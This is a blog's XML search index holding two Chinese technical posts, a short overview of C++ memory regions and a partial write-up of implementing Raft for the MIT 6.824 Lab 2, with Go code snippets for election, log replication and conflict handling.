<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++ 内存管理</title>
      <link href="/2023/03/26/C-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2023/03/26/C-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-内存管理"><a href="#1-内存管理" class="headerlink" title="1 内存管理"></a>1 内存管理</h1><h2 id="1-1-内存分配方式"><a href="#1-1-内存分配方式" class="headerlink" title="1.1 内存分配方式"></a>1.1 内存分配方式</h2><p>在C++中，内存分成5个区，他们分别是堆、栈、自由存储区、全局/静态存储区和常量存储区。</p><p>栈：在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。</p><p>堆：由new分配的内存块，他们的释放编译器不去管，由我们的应用程序去控制，一般一个new就要对应一个delete（也是Effective C++中提到的）。</p><p>自由存储区：由malloc等分配的内存块，他和堆是十分相似的，不过它是用free来结束自己的生命的。</p><p>全局/静态存储区：全局变量和静态变量被分配到同一块内存中。</p><p>常量存储区，这是一块比较特殊的存储区，他们里面存放的是常量，不允许修改。</p><h2 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h2>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.824 Lab</title>
      <link href="/2023/02/27/MIT6-824-Lab/"/>
      <url>/2023/02/27/MIT6-824-Lab/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>MIT6.824 实现起来可真的繁琐，分布式的bug调起来过于麻烦，看了无数个别人得实现，我还是太菜了，QAQ，所幸通过了Lab2。</p><p>lab2 的内容是要实现一个除了节点变更功能外的 raft 算法。论文中的图二（如下图）是实现raft的关键。如果想要形象化得看Raft算法是如何运转得，可以看这个(<a href="https://raft.github.io/">Raft Consensus Algorithm</a>。之前把代码开源出来收到邮件提醒叫我别这么做，我就不分享我的代码，只分享一些片段了。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/db47c459abba4e82b02f5164cfd7ebbc~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p><h1 id="2-Raft实现"><a href="#2-Raft实现" class="headerlink" title="2 Raft实现"></a>2 Raft实现</h1><h2 id="2-1-结构体"><a href="#2-1-结构体" class="headerlink" title="2.1 结构体"></a>2.1 结构体</h2><pre class="language-none"><code class="language-none">type Raft struct &#123;mu        sync.Mutex          &#x2F;&#x2F; Lock to protect shared access to this peer&#39;s statepeers     []*labrpc.ClientEnd &#x2F;&#x2F; RPC end points of all peerspersister *Persister          &#x2F;&#x2F; Object to hold this peer&#39;s persisted stateme        int                 &#x2F;&#x2F; this peer&#39;s index into peers[]dead      int32               &#x2F;&#x2F; set by Kill()&#x2F;&#x2F; Your data here (2A, 2B, 2C).&#x2F;&#x2F; Look at the paper&#39;s Figure 2 for a description of what&#x2F;&#x2F; state a Raft server must maintain.currentTermint           &#x2F;&#x2F; Server当前的termvoteForint           &#x2F;&#x2F; Server在选举阶段的投票目标logs            []LogEntrynextIndexs      []int         &#x2F;&#x2F; Leader在发送LogEntry时，对应每个其他Server，开始发送的indexmatchIndexs     []intcommitIndex     int           &#x2F;&#x2F; Server已经commit了的Log indexlastApplied     int           &#x2F;&#x2F; Server已经apply了的log indexmyStatus        Status        &#x2F;&#x2F; Server的状态timer           *time.Ticker  &#x2F;&#x2F; timervoteTimeout     time.Duration &#x2F;&#x2F; 选举超时时间，选举超时时间是会变动的，所以定义在Raft结构体中applyChan       chan ApplyMsg &#x2F;&#x2F; 消息channel&#x2F;&#x2F; 2DlastIncludeIndex  int         &#x2F;&#x2F; snapshot保存的最后log的indexlastIncludeTerm   int         &#x2F;&#x2F; snapshot保存的最后log的termsnapshotCmd       []byte&#125;</code></pre><h2 id="2-2-选主"><a href="#2-2-选主" class="headerlink" title="2.2 选主"></a>2.2 选主</h2><p>如果 follower 在 election timeout 内没有收到来自 leader 的心跳，（也许此时还没有选出 leader，大家都在等；也许 leader 挂了；也许只是 leader 与该 follower 之间网络故障），则会主动发起选举。</p><p>选举过程：</p><ul><li><ol><li>首先切换自己的状态<code>folower -&gt; canadiate</code>，增加自己的<code>current term</code>，给自己投一票</li></ol></li><li><ol><li>之后给剩余节点发送<code>RequestVote</code>，如果其他节点发现<code>canadiate</code>的<code>term</code>比自己的<code>term</code>大的话（在lab2A中是这样的，之后的实现还需要考虑<code>log replication</code>和<code>safety</code>），就会投票给那个节点</li></ol></li><li>等待回复</li></ul><p>可能的结果：</p><ol><li>收到的结果为大多数同意，则成为<code>leader</code></li><li>被告知其他的更新的<code>leader</code>存在，切换状态为<code>follower</code></li><li>一段时间没有收到大多数投票也没有被告知更新<code>leader</code>，重新发出选举</li></ol><p>按照论文中得实现即可，我这里面把选举超时时间和心跳时间实现在同一个<code>timer</code>，我认为当一个<code>peer</code>成为<code>leader</code>之后就不再需要持续的重置选举超时时间了。在Lab2A中，可以不实现<code>AppendEntries</code>，只需要发个空包就行。</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>rf <span class="token operator">*</span>Raft<span class="token punctuation">)</span> <span class="token function">ticker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> rf<span class="token punctuation">.</span><span class="token function">killed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span> <span class="token punctuation">&#123;</span><span class="token comment">// Your code here to check if a leader election should</span><span class="token comment">// be started and to randomize sleeping time using</span><span class="token comment">// time.Sleep().</span><span class="token keyword">select</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token operator">&lt;-</span>rf<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>C<span class="token punctuation">:</span><span class="token keyword">if</span> rf<span class="token punctuation">.</span><span class="token function">killed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>rf<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>currStatus <span class="token operator">:=</span> rf<span class="token punctuation">.</span>myStatus<span class="token keyword">switch</span> currStatus <span class="token punctuation">&#123;</span><span class="token keyword">case</span> Follower<span class="token punctuation">:</span>rf<span class="token punctuation">.</span>myStatus <span class="token operator">=</span> Candidate<span class="token keyword">fallthrough</span><span class="token keyword">case</span> Candidate<span class="token punctuation">:</span><span class="token comment">// 进行选举</span>rf<span class="token punctuation">.</span>currentTerm<span class="token operator">+=</span><span class="token number">1</span>rf<span class="token punctuation">.</span>voteFor <span class="token operator">=</span> rf<span class="token punctuation">.</span>me<span class="token comment">// 每轮选举开始时，重新设置选举超时</span>rf<span class="token punctuation">.</span>voteTimeout <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">Duration</span><span class="token punctuation">(</span>rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token operator">*</span>time<span class="token punctuation">.</span>MillisecondvoteNum <span class="token operator">:=</span> <span class="token number">1</span>rf<span class="token punctuation">.</span><span class="token function">persist</span><span class="token punctuation">(</span><span class="token punctuation">)</span>rf<span class="token punctuation">.</span>timer<span class="token punctuation">.</span><span class="token function">Reset</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>voteTimeout<span class="token punctuation">)</span><span class="token comment">// 构造msg</span><span class="token keyword">for</span> i<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token keyword">range</span> rf<span class="token punctuation">.</span>peers <span class="token punctuation">&#123;</span><span class="token keyword">if</span> i <span class="token operator">==</span> rf<span class="token punctuation">.</span>me <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">&#125;</span>voteArgs <span class="token operator">:=</span> <span class="token operator">&amp;</span>RequestVoteArgs<span class="token punctuation">&#123;</span>Term<span class="token punctuation">:</span>         rf<span class="token punctuation">.</span>currentTerm<span class="token punctuation">,</span>Candidate<span class="token punctuation">:</span>    rf<span class="token punctuation">.</span>me<span class="token punctuation">,</span>LastLogIndex<span class="token punctuation">:</span> <span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>logs<span class="token punctuation">)</span><span class="token operator">+</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token punctuation">,</span>LastLogTerm<span class="token punctuation">:</span>  rf<span class="token punctuation">.</span>lastIncludeTerm<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>logs<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>voteArgs<span class="token punctuation">.</span>LastLogTerm <span class="token operator">=</span> rf<span class="token punctuation">.</span>logs<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>logs<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Term<span class="token punctuation">&#125;</span>voteReply <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>RequestVoteReply<span class="token punctuation">)</span><span class="token comment">//DPrintf("发起选举",rf.me,i,voteArgs,rf.currentTerm, rf.lastIncludeIndex, rf.lastIncludeTerm)</span><span class="token keyword">go</span> rf<span class="token punctuation">.</span><span class="token function">sendRequestVote</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> voteArgs<span class="token punctuation">,</span> voteReply<span class="token punctuation">,</span> <span class="token operator">&amp;</span>voteNum<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> Leader<span class="token punctuation">:</span><span class="token comment">// 进行心跳</span>appendNum <span class="token operator">:=</span> <span class="token number">1</span>rf<span class="token punctuation">.</span>timer<span class="token punctuation">.</span><span class="token function">Reset</span><span class="token punctuation">(</span>HeartBeatTimeout<span class="token punctuation">)</span><span class="token comment">// 构造msg</span><span class="token keyword">for</span> i<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token keyword">range</span> rf<span class="token punctuation">.</span>peers <span class="token punctuation">&#123;</span><span class="token keyword">if</span> i <span class="token operator">==</span> rf<span class="token punctuation">.</span>me <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">&#125;</span>appendEntriesArgs <span class="token operator">:=</span> <span class="token operator">&amp;</span>AppendEntriesArgs<span class="token punctuation">&#123;</span>Term<span class="token punctuation">:</span>         rf<span class="token punctuation">.</span>currentTerm<span class="token punctuation">,</span>LeaderId<span class="token punctuation">:</span>     rf<span class="token punctuation">.</span>me<span class="token punctuation">,</span>PrevLogIndex<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>PrevLogTerm<span class="token punctuation">:</span>  <span class="token number">0</span><span class="token punctuation">,</span>Logs<span class="token punctuation">:</span>         <span class="token boolean">nil</span><span class="token punctuation">,</span>LeaderCommit<span class="token punctuation">:</span> rf<span class="token punctuation">.</span>commitIndex<span class="token punctuation">,</span>LogIndex<span class="token punctuation">:</span>     <span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>logs<span class="token punctuation">)</span><span class="token operator">+</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">//installSnapshot，如果rf.nextIndex[i]小于等lastCludeIndex,则发送snapShot</span><span class="token keyword">if</span> rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> rf<span class="token punctuation">.</span>lastIncludeIndex <span class="token punctuation">&#123;</span>installSnapshotReq <span class="token operator">:=</span> <span class="token operator">&amp;</span>InstallSnapshotRequest<span class="token punctuation">&#123;</span>Term<span class="token punctuation">:</span>             rf<span class="token punctuation">.</span>currentTerm<span class="token punctuation">,</span>LeaderId<span class="token punctuation">:</span>         rf<span class="token punctuation">.</span>me<span class="token punctuation">,</span>LastIncludeIndex<span class="token punctuation">:</span> rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token punctuation">,</span>LastIncludeTerm<span class="token punctuation">:</span>  rf<span class="token punctuation">.</span>lastIncludeTerm<span class="token punctuation">,</span>Data<span class="token punctuation">:</span>             rf<span class="token punctuation">.</span>snapshotCmd<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>installSnapshotReply <span class="token operator">:=</span> <span class="token operator">&amp;</span>InstallSnapshotResponse<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//DPrintf("installsnapshot", rf.me, i, rf.lastIncludeIndex, rf.lastIncludeTerm, rf.currentTerm, installSnapshotReq)</span><span class="token keyword">go</span> rf<span class="token punctuation">.</span><span class="token function">sendInstallSnapshot</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> installSnapshotReq<span class="token punctuation">,</span> installSnapshotReply<span class="token punctuation">)</span><span class="token keyword">continue</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> rf<span class="token punctuation">.</span>lastIncludeIndex <span class="token punctuation">&#123;</span>appendEntriesArgs<span class="token punctuation">.</span>PrevLogIndex <span class="token operator">=</span> rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token keyword">if</span> appendEntriesArgs<span class="token punctuation">.</span>PrevLogIndex <span class="token operator">>=</span> <span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>logs<span class="token punctuation">)</span><span class="token operator">+</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token operator">+</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">--</span><span class="token keyword">continue</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> appendEntriesArgs<span class="token punctuation">.</span>PrevLogIndex <span class="token operator">==</span> rf<span class="token punctuation">.</span>lastIncludeIndex <span class="token punctuation">&#123;</span>appendEntriesArgs<span class="token punctuation">.</span>PrevLogTerm <span class="token operator">=</span> rf<span class="token punctuation">.</span>lastIncludeTerm<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>appendEntriesArgs<span class="token punctuation">.</span>PrevLogTerm <span class="token operator">=</span> rf<span class="token punctuation">.</span>logs<span class="token punctuation">[</span>appendEntriesArgs<span class="token punctuation">.</span>PrevLogIndex<span class="token operator">-</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Term<span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>logs<span class="token punctuation">)</span><span class="token operator">+</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token operator">+</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>appendEntriesArgs<span class="token punctuation">.</span>Logs <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>LogEntry<span class="token punctuation">,</span>appendEntriesArgs<span class="token punctuation">.</span>LogIndex<span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span>rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token function">copy</span><span class="token punctuation">(</span>appendEntriesArgs<span class="token punctuation">.</span>Logs<span class="token punctuation">,</span> rf<span class="token punctuation">.</span>logs<span class="token punctuation">[</span>rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>appendEntriesArgs<span class="token punctuation">.</span>LogIndex<span class="token operator">-</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>appendEntriesReply <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>AppendEntriesReply<span class="token punctuation">)</span><span class="token keyword">go</span> rf<span class="token punctuation">.</span><span class="token function">sendAppendEntries</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> appendEntriesArgs<span class="token punctuation">,</span> appendEntriesReply<span class="token punctuation">,</span> <span class="token operator">&amp;</span>appendNum<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>rf<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>注意点：</p><ul><li>在<code>guiandance</code>中有提到，对于过期请求的回复，可以直接抛弃，虽然test文件中没有相关的case来判断代码的对错，但是我还是实现了一下如何回复。</li><li>对于投票统计可以在<code>raft</code>结构体中直接记录，也可以在<code>ticker()</code>函数中使用局部函数变量统计。</li><li>多注意细节，如选举时间/心跳包时间的重置问题等； </li></ul><h2 id="2-3-日志复制"><a href="#2-3-日志复制" class="headerlink" title="2.3 日志复制"></a>2.3 日志复制</h2><p>每个节点存储自己的日志副本(<code>log[]</code>)，每条日志记录包含，有的实现也包含<code>index</code>，我把<code>index</code>放到节点本身去存储了：</p><ul><li>索引：该记录在日志中的位置</li><li>命令</li></ul><h2 id="2-3-1-日志同步"><a href="#2-3-1-日志同步" class="headerlink" title="2.3.1 日志同步"></a>2.3.1 日志同步</h2><p>解决问题：</p><ul><li>Leader发送心跳宣示自己的主权，Follower不会发起选举。</li><li>Leader将自己的日志数据同步到Follower，达到数据备份的效果。</li></ul><p>主要过程：<br>日志同步要解决如下两个问题：</p><ul><li>Leader发送心跳宣示自己的主权，Follower不会发起选举。</li><li>Leader将自己的日志数据同步到Follower，达到数据备份的效果。</li></ul><p>运行流程</p><ol><li>客户端向 <code>Leader</code> 发送命令，希望该命令被所有状态机执行；</li><li><code>Leader</code> 先将该命令追加到自己的日志中；</li><li><code>Leader</code> 并行地向其它节点发送 <code>AppendEntries RPC</code>，等待响应；收到超过半数节点的响应，则认为新的日志记录是被提交的：</li><li><code>Leader</code> 将命令传给自己的状态机，然后向客户端返回响应;此外，一旦 <code>Leader</code> 知道一条记录被提交了，将在后续的 <code>AppendEntries RPC</code> 中通知已经提交记录的 <code>Followers</code>;<code>Follower</code> 将已提交的命令传给自己的状态机</li><li>如果 <code>Follower</code> 宕机/超时：<code>Leader</code> 将反复尝试发送 <code>RPC</code>；</li></ol><p>以下是代码实现的主要逻辑，可以不必等待所有节点的请求，超过一半即可执行。<br><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">switch</span> reply<span class="token punctuation">.</span>AppendErr <span class="token punctuation">&#123;</span><span class="token keyword">case</span> AppendErr_Nil<span class="token punctuation">:</span><span class="token keyword">if</span> reply<span class="token punctuation">.</span>Success <span class="token operator">&amp;&amp;</span> reply<span class="token punctuation">.</span>Term <span class="token operator">==</span> rf<span class="token punctuation">.</span>currentTerm <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>appendNum <span class="token operator">&lt;=</span> <span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>peers<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span> <span class="token punctuation">&#123;</span><span class="token operator">*</span>appendNum<span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>server<span class="token punctuation">]</span> <span class="token operator">></span> args<span class="token punctuation">.</span>LogIndex<span class="token operator">+</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> ok<span class="token punctuation">&#125;</span>rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>server<span class="token punctuation">]</span> <span class="token operator">=</span> args<span class="token punctuation">.</span>LogIndex<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">if</span> <span class="token operator">*</span>appendNum <span class="token operator">></span> <span class="token function">len</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>peers<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span> <span class="token punctuation">&#123;</span><span class="token operator">*</span>appendNum <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>LogIndex<span class="token operator">></span>rf<span class="token punctuation">.</span>lastIncludeIndex <span class="token operator">&amp;&amp;</span> rf<span class="token punctuation">.</span>logs<span class="token punctuation">[</span>args<span class="token punctuation">.</span>LogIndex<span class="token operator">-</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Term <span class="token operator">!=</span> rf<span class="token punctuation">.</span>currentTerm<span class="token punctuation">)</span> <span class="token operator">||</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>LogIndex <span class="token operator">==</span> rf<span class="token punctuation">.</span>lastIncludeIndex <span class="token operator">&amp;&amp;</span> rf<span class="token punctuation">.</span>lastIncludeTerm <span class="token operator">!=</span> rf<span class="token punctuation">.</span>currentTerm<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> rf<span class="token punctuation">.</span>lastApplied <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>LogIndex <span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>lastApplied<span class="token operator">++</span>applyMsg <span class="token operator">:=</span> ApplyMsg<span class="token punctuation">&#123;</span>CommandValid<span class="token punctuation">:</span>  <span class="token boolean">true</span><span class="token punctuation">,</span>Command<span class="token punctuation">:</span>       rf<span class="token punctuation">.</span>logs<span class="token punctuation">[</span>rf<span class="token punctuation">.</span>lastApplied<span class="token operator">-</span>rf<span class="token punctuation">.</span>lastIncludeIndex<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Cmd<span class="token punctuation">,</span>CommandIndex<span class="token punctuation">:</span>  rf<span class="token punctuation">.</span>lastApplied<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>rf<span class="token punctuation">.</span>applyChan <span class="token operator">&lt;-</span> applyMsgrf<span class="token punctuation">.</span>commitIndex <span class="token operator">=</span> rf<span class="token punctuation">.</span>lastApplied<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> AppendErr_ReqOutofDate<span class="token punctuation">:</span>rf<span class="token punctuation">.</span>myStatus <span class="token operator">=</span> Followerrf<span class="token punctuation">.</span>timer<span class="token punctuation">.</span><span class="token function">Reset</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>voteTimeout<span class="token punctuation">)</span><span class="token keyword">if</span> reply<span class="token punctuation">.</span>Term <span class="token operator">></span> rf<span class="token punctuation">.</span>currentTerm <span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>currentTerm <span class="token operator">=</span> reply<span class="token punctuation">.</span>Termrf<span class="token punctuation">.</span>voteFor <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>rf<span class="token punctuation">.</span><span class="token function">persist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> AppendErr_LogsNotMatch<span class="token punctuation">:</span><span class="token keyword">if</span> args<span class="token punctuation">.</span>Term <span class="token operator">!=</span> rf<span class="token punctuation">.</span>currentTerm <span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>server<span class="token punctuation">]</span> <span class="token operator">=</span> reply<span class="token punctuation">.</span>NotMatchIndex<span class="token keyword">case</span> AppendErr_ReqRepeat<span class="token punctuation">:</span><span class="token keyword">if</span> reply<span class="token punctuation">.</span>Term <span class="token operator">></span> rf<span class="token punctuation">.</span>currentTerm <span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>myStatus <span class="token operator">=</span> Followerrf<span class="token punctuation">.</span>currentTerm <span class="token operator">=</span> reply<span class="token punctuation">.</span>Termrf<span class="token punctuation">.</span>voteFor <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>rf<span class="token punctuation">.</span>timer<span class="token punctuation">.</span><span class="token function">Reset</span><span class="token punctuation">(</span>rf<span class="token punctuation">.</span>voteTimeout<span class="token punctuation">)</span>rf<span class="token punctuation">.</span><span class="token function">persist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> AppendErr_Commited<span class="token punctuation">:</span><span class="token keyword">if</span> args<span class="token punctuation">.</span>Term <span class="token operator">!=</span> rf<span class="token punctuation">.</span>currentTerm <span class="token punctuation">&#123;</span>rf<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>rf<span class="token punctuation">.</span>nextIndexs<span class="token punctuation">[</span>server<span class="token punctuation">]</span> <span class="token operator">=</span> reply<span class="token punctuation">.</span>NotMatchIndex<span class="token keyword">case</span> AppendErr_RaftKilled<span class="token punctuation">:</span>rf<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span></code></pre></p><h3 id="2-3-2-日志应用"><a href="#2-3-2-日志应用" class="headerlink" title="2.3.2 日志应用"></a>2.3.2 日志应用</h3><p>一旦发现commitIndex大于lastApplied，应该立马将可应用的日志应用到状态机中。Raft节点本身是没有状态机实现的，状态机应该由Raft的上层应用来实现，因此只需将日志发送给applyCh这个通道即可。据说有更加优雅的实现(<a href="https://cn.pingcap.com/blog//optimizing-raft-in-tikv/">TiKV 功能介绍 - Raft 的优化 | PingCAP</a>)，我就不贴我的代码了。<br>存在一个冲突优化，助教有提到：</p><ul><li>If a follower does not have <code>prevLogIndex</code> in its log, it should return with <code>conflictIndex = len(log)</code> and <code>conflictTerm = None</code>.  </li><li>If a follower does have <code>prevLogIndex</code> in its log, but the term does not match, it should return <code>conflictTerm = log[prevLogIndex].Term</code>, and then search its log for the first index whose entry has term equal to <code>conflictTerm</code>.  </li><li>Upon receiving a conflict response, the leader should first search its log for <code>conflictTerm</code>. If it finds an entry in its log with that term, it should set <code>nextIndex</code> to be the one beyond the index of the last entry in that term in its log.  </li><li>If it does not find an entry with that term, it should set <code>nextIndex = conflictIndex</code>.<br>翻译一下就是添加<code>ConflictIndex</code>和<code>ConflictTerm</code>字段：</li></ul><ol><li>若 <code>follower</code> 没有 <code>prevLogIndex</code> 处的日志，则直接置 <code>conflictIndex = len(log)，conflictTerm = None</code>；</li></ol><ul><li><code>leader</code> 收到返回体后，肯定找不到对应的 <code>term</code>，则设置<code>nextIndex = conflictIndex</code>；</li><li>其实就是 <code>leader</code> 对应的 <code>nextIndex</code> 直接回退到该 <code>follower</code> 的日志条目末尾处，因为 <code>prevLogIndex</code> 超前了</li></ul><ol><li>若 <code>follower</code> 有 <code>prevLogIndex</code> 处的日志，但是 <code>term</code> 不匹配；则设置 <code>conlictTerm</code>为 <code>prevLogIndex</code> 处的 <code>term</code>，且肯定可以找到日志中该 <code>term</code>出现的第一个日志条目的下标，并置<code>conflictIndex = firstIndexWithTerm</code>；</li></ol><p><code>leader</code> 收到返回体后，有可能找不到对应的 <code>term</code>，即 <code>leader</code> 和 <code>follower</code> 在<code>conflictIndex</code>处以及之后的日志都有冲突，都不能要了，直接置<code>nextIndex = conflictIndex</code><br>若找到了对应的<code>term</code>，则找到对应<code>term</code>出现的最后一个日志条目的下一个日志条目，即置<code>nextIndex = lastIndexWithTerm + 1</code>；这里其实是默认了若 <code>leader</code> 和 <code>follower</code> 同时拥有该 <code>term</code> 的日志，则不会有冲突，直接取下一个 <code>term</code> 作为日志发起就好，是源自于 <code>safety</code> 的安全性保证<br>如果还有冲突，<code>leader</code> 和 <code>follower</code> 会一直根据以上规则回溯 <code>nextIndex</code></p><h2 id="2-4-持久化"><a href="#2-4-持久化" class="headerlink" title="2.4 持久化"></a>2.4 持久化</h2><p>持久化是最简单的部分，在Raft论文中需要持久化的字段只有3个 